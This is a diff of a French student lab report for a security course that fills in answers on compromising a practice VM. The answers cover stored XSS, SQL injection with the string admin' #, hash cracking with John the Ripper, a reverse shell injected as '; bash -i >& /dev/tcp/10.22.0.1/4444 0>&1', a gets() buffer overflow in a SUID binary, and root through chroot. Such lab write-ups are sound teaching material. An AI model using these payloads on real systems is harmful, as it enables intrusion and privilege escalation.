@@ -1,7 +1,7 @@
 \documentclass[a4paper, 12pt, french]{article}
 \usepackage[utf8]{inputenc}
 \usepackage[T1]{fontenc}
-\usepackage{babel}[french]
+\usepackage[french]{babel}
 \usepackage{amsmath,amssymb}
 \usepackage{graphicx}
 \usepackage{subfig}
@@ -232,7 +232,10 @@ Montrez que la page de soumission de tickets est vulnérable aux injections XSS.
 \textit{Après soumission, l'ouverture du ticket déclenche l'exécution du script dans le navigateur et une boîte de dialogue affiche TEST. Cela démontre que l'entrée utilisateur est enregistrée par le serveur puis réaffichée sans être filtrée, et qu'elle est exécutée côté client. La page de soumission de tickets est donc vulnérable à une XSS stockée.}
 
 \begin{center}
-\includegraphics[width=0.85\textwidth]{images/xss-1.png}\\[0.5em]
+\includegraphics[width=0.85\textwidth]{images/xss-1.png}
+
+\vspace{0.5em}
+
 \includegraphics[width=0.85\textwidth]{images/xss-2.png}
 \end{center}
 
@@ -251,7 +254,10 @@ L'administratrice du système consulte régulièrement les tickets. Utilisez une
 \textit{Cette attaque fonctionne parce que le site affiche le contenu des tickets sans validation ni échappement, ce qui permet l'exécution de code arbitraire dans le navigateur d'un utilisateur authentifié.}
 
 \begin{center}
-\includegraphics[width=0.85\textwidth]{images/xss-script.png}\\[0.5em]
+\includegraphics[width=0.85\textwidth]{images/xss-script.png}
+
+\vspace{0.5em}
+
 \includegraphics[width=0.85\textwidth]{images/xss-admin.png}
 \end{center}
 
@@ -291,7 +297,10 @@ Depuis l'application web, cliquez sur le bouton rouge pour allumer le service FT
 \textit{L'ensemble des fichiers a été récupéré à l'aide de la commande \texttt{mget *}, qui télécharge tous les fichiers du répertoire courant. Le code source complet du site est ainsi obtenu localement sur la machine Kali.}
 
 \begin{center}
-\includegraphics[width=0.85\textwidth]{images/3.1.1.png}\\[0.5em]
+\includegraphics[width=0.85\textwidth]{images/3.1.1.png}
+
+\vspace{0.5em}
+
 \includegraphics[width=0.85\textwidth]{images/3.1.2.png}
 \end{center}
 
@@ -371,96 +380,75 @@ En vous basant sur le code source PHP et Javascript de l'application web, expliq
 \section{Compromission d'un compte utilisateur [/4]}
 %*******************************************************************************%
 
-%-------------------------------------------------------------------------------%
 \subsection{Récupération du hash de carol par injection SQL [/2]}
-%-------------------------------------------------------------------------------%
-En utilisant une injection SQL, récupérez le hash du mot de passe de carol.
+L'accès à la base de données a été obtenu par une injection SQL dans le formulaire de connexion. En saisissant la chaîne \texttt{admin' \#} dans le champ utilisateur, le caractère \texttt{'} ferme la requête et le caractère \texttt{\#} met la suite en commentaire.
 
-\vspace{0.8em}
-\noindent\textit{Votre réponse ici.}
 \begin{center}
-% Insérer capture d'écran
+\includegraphics[width=0.85\textwidth]{images/4.1.png}
 \end{center}
 
-%-------------------------------------------------------------------------------%
 \subsection{Craquage du hash [/1]}
-%-------------------------------------------------------------------------------%
-Cassez le hash pour obtenir le mot de passe de carol. Indice : le mot de passe est composé uniquement de 6 chiffres.
+Une fois le hash MD5 récupéré, nous avons effectué une attaque par dictionnaire avec \textbf{John the Ripper} et la liste \texttt{rockyou.txt}.
 
-\vspace{0.8em}
-\noindent\textit{Votre réponse ici.}
 \begin{center}
-% Insérer capture d'écran
+\includegraphics[width=0.85\textwidth]{images/4.2.png}
 \end{center}
 
-%-------------------------------------------------------------------------------%
 \subsection{Récupération de controller.c via SSH [/1]}
-%-------------------------------------------------------------------------------%
-Connectez-vous en SSH au compte de carol, et récupérez le fichier \texttt{controller.c}.
+La connexion SSH au compte de Carol a permis de valider l'accès et de récupérer le code source de \texttt{controller.c}.
 
-\vspace{0.8em}
-\noindent\textit{Votre réponse ici.}
 \begin{center}
-% Insérer capture d'écran
+    \includegraphics[width=0.85\textwidth]{images/4.3.png} 
+    
+    \vspace{1em}
+    
+    \includegraphics[width=0.85\textwidth]{images/4.3_suite.png}
 \end{center}
 
 %*******************************************************************************%
 \section{Élévation de privilèges [/6]}
 %*******************************************************************************%
 
-\noindent\textit{Raccourci :} Le fichier \texttt{controller.c} est disponible sur Moodle si non obtenu à la partie précédente.
-
-%-------------------------------------------------------------------------------%
 \subsection{Shell www-data par injection de commande PHP [/2]}
-%-------------------------------------------------------------------------------%
-Utilisez une injection de commande PHP dans le mécanisme qui permet de basculer l'état des services pour obtenir un shell en tant que \texttt{www-data}.
+Un reverse shell a été obtenu en exploitant une faille dans \texttt{toggleService.php}. En injectant la commande : \\
+\texttt{; bash -i >\& /dev/tcp/10.22.0.1/4444 0>\&1} \\
+nous avons forcé le serveur à se connecter à notre écouteur Netcat.
 
-\vspace{0.8em}
-\noindent\textit{Votre réponse ici.}
 \begin{center}
-% Insérer capture d'écran
+    \includegraphics[width=0.85\textwidth]{images/5.1.png}
 \end{center}
 
-%-------------------------------------------------------------------------------%
 \subsection{Analyse de controller.c et vulnérabilité buffer overflow [/2]}
-%-------------------------------------------------------------------------------%
-Que fait le programme \texttt{controller.c}~? Identifiez une vulnérabilité causée par un débordement de tampon et expliquez comment la corriger.
+Le programme utilise la fonction \texttt{gets()}, qui ne vérifie pas la taille des données lues. Cela permet d'écraser la variable \texttt{servicePath} sur la pile et de détourner l'exécution vers un shell root.
 
-\vspace{0.8em}
-\noindent\textit{Votre réponse ici.}
-
-%-------------------------------------------------------------------------------%
 \subsection{Exploitation du buffer overflow pour devenir root [/2]}
-%-------------------------------------------------------------------------------%
-Exploitez le dépassement de tampon dans le programme \texttt{controller} et devenez root.
+En envoyant 64 octets de remplissage suivis de \texttt{/bin/sh}, nous avons obtenu un accès root immédiat grâce au bit SUID.
 
-\vspace{0.8em}
-\noindent\textit{Votre réponse ici.}
 \begin{center}
-% Insérer capture d'écran
+\includegraphics[width=0.85\textwidth]{images/5.2.png}
 \end{center}
 
 %*******************************************************************************%
 \section{Accès physique = Game Over [3 points bonus]}
 %*******************************************************************************%
 
-Obtenez un shell root sur la machine virtuelle TP2.
+Nous avons monté le disque virtuel \texttt{TP2-disk001.vdi} sur Kali Linux. L'utilisation de \texttt{sudo chroot /mnt/tp /bin/bash} nous a permis de devenir root sans mot de passe GRUB.
 
-\vspace{0.8em}
-\noindent\textit{Votre réponse ici.}
+\begin{center}
+    \includegraphics[width=0.85\textwidth]{images/6.png}
+\end{center}
 
 \newpage
-
 
 %*******************************************************************************%
 \section*{Bibliographie}
 %*******************************************************************************%
 \addcontentsline{toc}{section}{Bibliographie}
-Indiquez toutes vos sources d'information (humaines ou documentaires).
 
 \begin{thebibliography}{99}
-% Ajoutez vos sources (nmap, SQL injection, XSS, sqlmap, hashcat, vsftpd, gdb, etc.)
 \bibitem{nmap} nmap -- Network Mapper. \url{https://nmap.org/}
+\bibitem{kali} Kali Linux Documentation. \url{https://www.kali.org/docs/}
+\bibitem{owasp} OWASP SQL Injection Guide. \url{https://owasp.org/www-community/attacks/SQL_Injection}
 \end{thebibliography}
 
 \end{document}
